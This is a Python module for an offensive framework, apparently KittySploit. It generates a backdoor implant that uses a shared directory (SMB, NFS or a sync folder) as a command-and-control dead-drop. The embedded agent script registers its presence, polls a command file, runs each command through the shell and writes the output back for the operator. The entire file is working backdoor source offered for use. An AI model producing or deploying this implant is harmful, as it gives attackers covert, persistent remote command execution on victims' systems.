from kittysploit import *


class Module(Backdoor):
	"""Filesystem dead-drop agent for dropbox_like_polling listener."""

	__info__ = {
		"name": "Filesystem Dropbox-like Polling Agent",
		"description": (
			"Writes a Python implant that uses a shared directory as C2 dead-drop "
			"(register/commands/results). Controller: listeners/filesystem/dropbox_like_polling. "
			"Requires a shared path (SMB/NFS/sync) — install as backdoor, not exploit payload."
		),
		"author": "KittySploit Team",
		"platform": Platform.MULTI,
		"arch": Arch.PYTHON,
		"session_type": SessionType.POLLING,
		"listener": "listeners/filesystem/dropbox_like_polling",
	}

	root_dir = OptString("/tmp/ks-dropbox-c2", "Shared C2 root (must match listener)", True)
	client_id = OptString("agent1", "Client ID", False)
	poll_interval = OptInteger(2, "Poll interval seconds", False)
	filename = OptString("", "Output filename (empty = random .py)", False)

	def check(self):
		return bool(str(self.root_dir or "").strip())

	def run(self):
		if not self.check():
			print_error("root_dir is required")
			return False

		root = str(self.root_dir).strip()
		cid = str(self.client_id or "agent1").strip() or "agent1"
		interval = max(1, int(self.poll_interval or 2))

		script = f'''#!/usr/bin/env python3
import os,subprocess,time,uuid
ROOT={root!r}; CID={cid!r}; INTERVAL={interval}
REG=os.path.join(ROOT,"register"); CMD=os.path.join(ROOT,"commands"); RES=os.path.join(ROOT,"results")
for d in (REG,CMD,RES):
  try: os.makedirs(d, exist_ok=True)
  except Exception: pass
# register presence
open(os.path.join(REG, CID+".agent"),"w",encoding="utf-8").write(str(time.time()))
cmd_path=os.path.join(CMD, CID+".cmd")
last_mtime=None
while True:
  try:
    if os.path.isfile(cmd_path):
      st=os.stat(cmd_path)
      if last_mtime is None or st.st_mtime > last_mtime:
        last_mtime=st.st_mtime
        with open(cmd_path,"r",encoding="utf-8",errors="replace") as f:
          cmd=f.read()
        if cmd.strip():
          try:
            p=subprocess.run(cmd,shell=True,capture_output=True,timeout=120)
            out=(p.stdout or b"")+(p.stderr or b"")
            if not out: out=("exit %s\\n"%p.returncode).encode()
          except Exception as e:
            out=("ERROR:%s\\n"%e).encode()
          nonce=uuid.uuid4().hex[:8]
          out_path=os.path.join(RES, "%s.%s.out"%(CID,nonce))
          with open(out_path,"wb") as f: f.write(out)
          # clear command to avoid re-exec on next poll with same mtime edge cases
          try: open(cmd_path,"w").write("")
          except Exception: pass
  except Exception:
    pass
  time.sleep(INTERVAL)
'''

		name = str(self.filename or "").strip() or (self.random_text(8) + "_dropbox_agent.py")
		if not name.endswith(".py"):
			name += ".py"
		if not self.write_out_dir(name, script):
			print_error("Failed to write agent file")
			return False
		print_success(f"Generated: {name}")
		print_info(f"root_dir={root}  client_id={cid}")
		print_info("Start listeners/filesystem/dropbox_like_polling with the same root_dir")
		print_warning("Backdoor implant (shared dead-drop) — not for exploit payload chaining")
		return True
